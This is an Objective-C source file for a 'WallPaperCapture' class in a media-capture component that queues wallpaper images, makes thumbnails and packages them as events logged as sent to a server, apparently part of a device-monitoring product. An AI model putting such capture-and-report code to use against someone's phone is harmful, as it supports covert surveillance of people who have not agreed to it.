/**
 - Project name :  MediaCaptureManager
 - Class name   :  WallPaperCapture
 - Version      :  1.0  
 - Purpose      :  For MediaCaptureManager Component
 - Copy right   :  14/2/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "WallPaperCapture.h"
#import "FxSystemEvent.h"
@implementation WallPaperCapture

/**
 - Method name:initWithEventDelegate:andMediaThumbnailManager
 - Purpose: This method is used initialize WallPaperCapture class
 - Argument list and description: aEventDelegate (EventDelegate),aMediaThumbnailDelegate(MediaThumbnailManager)
 - Return type and description: (id) WallPaperCapture instance
*/

- (id) initWithEventDelegate: (id <EventDelegate>) aEventDelegate 
	andMediaThumbnailManager: (id <MediaThumbnailManager>) aMediaThumbnailManager  {
    if (self = [super init]) {
		mWallPaperCaptureQueue=[[NSMutableArray alloc]init];
		mEventDelegate=aEventDelegate;
		mMediaThumbnailManager=aMediaThumbnailManager;
		mIsBusy=NO;
    }
    return self;
}

/**
 - Method name:addPathToWallPaperQueue:
 - Purpose: This method is used  to add wallpaper path to the queue
 - Argument list and description: aWallPaperPath (NSString)
 - Return type and description: No Return
 */

- (void) addPathToWallPaperQueue: (NSString *) aWallPaperPath {
	DLog (@"Add wallpaper path:(%@) to the queue",aWallPaperPath)
	[mWallPaperCaptureQueue addObject:aWallPaperPath];
}

/**
 - Method name:processWallPaperCaptureQueue
 - Purpose: This method is used  to process Wallpaper thumbnail generation
 - Argument list and description: No Argument
 - Return type and description: No Return
*/

- (void) processWallPaperCaptureQueue {
	if ([mWallPaperCaptureQueue count] && !mIsBusy) {
		mIsBusy=YES;
		NSString *wallpaperPath=[mWallPaperCaptureQueue objectAtIndex:0];
		DLog (@"====>processWallPaperCaptureQueue:%@",wallpaperPath);
		
//		NSFileManager *fileManager = [NSFileManager defaultManager];
//		NSDictionary *fileAttributes = [fileManager attributesOfItemAtPath:wallpaperPath error:nil];
//		NSUInteger oneMeg = 1020 * 1024;
//		NSUInteger sizeInMeg = [fileAttributes fileSize] / oneMeg;
//		// Check max file size 10 Mb
//		if (sizeInMeg > 10) {
		if (0) {
			// Create system event if media is too big
			FxSystemEvent *systemEvent=[[FxSystemEvent alloc] init];
			NSString *message = NSLocalizedString(@"kMediaEventTooBigCannotDeliver", @"");
			[systemEvent setMessage:message];
			[systemEvent setSystemEventType:kSystemEventTypeMediaEventMaxSizeReached];
			[systemEvent setDirection:kEventDirectionOut];
			[systemEvent setDateTime:[DateTimeFormat phoenixDateTime]];
			if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
				[mEventDelegate performSelector:@selector(eventFinished:) withObject:systemEvent];
			}
			[systemEvent release];
			
			[self removeProcessedPathFromWallPaperCaptureQueue];
			mIsBusy = NO;
			[self performSelector:@selector(processWallPaperCaptureQueue) withObject:nil afterDelay:0.1];
		} else {
			[mMediaThumbnailManager createImageThumbnail:wallpaperPath delegate:self];
		}
	}
	
}

/**
 - Method name:removeProcessedPathFromWallPaperCaptureQueue
 - Purpose: This method is used  to remove processed Wallpaper 
 - Argument list and description: No Argument
 - Return type and description: No Return
 */

- (void) removeProcessedPathFromWallPaperCaptureQueue {
	if ([mWallPaperCaptureQueue count]) {
		DLog (@"====>removeProcessedPathFromWallPaperCaptureQueue")
		[mWallPaperCaptureQueue removeObjectAtIndex:0];
	}
}

#pragma mark MediaThumbnailManager Delegate Methods

/**
 - Method name:thumbnailCreationDidFinished:mediaInfo:thumbnailPath:
 - Purpose: This method is invoked when thumbnail processig is completed.
 - Argument list and description: aError (NSError),aMedia(MediaInfo ),aPaths(id)
 - Return type and description: No Return
 */

- (void) thumbnailCreationDidFinished: (NSError *) aError
							mediaInfo: (MediaInfo *) aMedia
						thumbnailPath: (id) aPaths {
	
	DLog (@"WallPaper thumbnail creation completed...");
	DLog (@"\n===================================\n");
	DLog (@"Media Length:%ld",(long)[aMedia mMediaLength]);
	DLog (@"Media Type:%d",[aMedia mMediaInputType]);
	DLog (@"Media Full Path:%@",[aMedia mMediaFullPath]);
	DLog (@"Media Size:%llu",[aMedia mMediaSize]);
	DLog (@"Thumbnail Length:%ld",(long)[aMedia mThumbnailLength]);
	DLog (@"Thumbnail Size:%llu",[aMedia mThumbnailSize]);
	DLog (@"Error Code:%ld",(long)[aError code]);
	DLog (@"Thumbnail Path(s):%@",aPaths);
	DLog (@"\n===================================");
	
	[self removeProcessedPathFromWallPaperCaptureQueue];
	
	if ([aError code]==kMediaThumbnailOK) {
		FxMediaEvent *mediaEvent=[[FxMediaEvent alloc]init];
		FxThumbnailEvent *tEvent=[[FxThumbnailEvent alloc]init];
		[tEvent setFullPath:(NSString *)aPaths];
		[tEvent setActualSize:[aMedia mMediaSize]];
		[tEvent setEventType:kEventTypeWallpaperThumbnail];	 
		[tEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[tEvent setActualDuration:[aMedia mMediaLength]];
		[mediaEvent addThumbnailEvent:tEvent];
		[tEvent release];
		[mediaEvent setFullPath:[aMedia mMediaFullPath]];
		[mediaEvent setEventType:kEventTypeWallpaper];
		[mediaEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		//=============================SEND WALLPAPER EVENT==============================================
		if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:mediaEvent withObject:self];
			DLog (@"Send WallPaper event to the server")
		}
		[mediaEvent release];
	} 
	else {
		DLog (@"[aError code] = %ld", (long)[aError code]);
	}
	mIsBusy=NO;
	[self performSelector:@selector(processWallPaperCaptureQueue) withObject:nil afterDelay:0.1];
}

/**
 - Method name:dealloc
 - Purpose: This is memory mangement method. Invoked when the class object releasd.
 - Argument list and description: No argument
 - Return type and description: No Return
*/

- (void) dealloc {
	[mWallPaperCaptureQueue release];
	[super dealloc];
}

@end
